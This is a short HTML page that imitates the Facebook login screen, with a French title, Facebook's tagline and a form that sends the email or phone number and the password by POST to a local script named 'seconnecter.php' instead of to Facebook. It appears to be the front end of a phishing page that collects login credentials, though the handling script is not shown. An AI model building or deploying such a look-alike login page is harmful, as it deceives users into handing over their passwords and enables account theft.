<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook – Connexion ou inscription</title>
  <link rel="stylesheet" href="../res/css/seconnecter.css">
</head>
<body>
  <div class="center-container">
    <div class="fb-logo">

    </div>
    <div style="font-size: 22px; color: #1c1e21; text-align: center; margin-bottom: 24px; max-width: 400px;">Connect with friends and the world around you on Facebook.</div>
    <div class="form-container">
      <form action="seconnecter.php" method="POST">
        <input type="text" name="email" placeholder="Email address or phone number" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Log In</button>
      </form>
      <a href="#" class="forgot">Forgot password?</a>
      <hr>
      <button class="create-account">Create new account</button>
    </div>
    <div class="create-page">
      <a href="#">Create a Page</a> for a celebrity, brand or business.
    </div>
  </div>
</body>
</html>
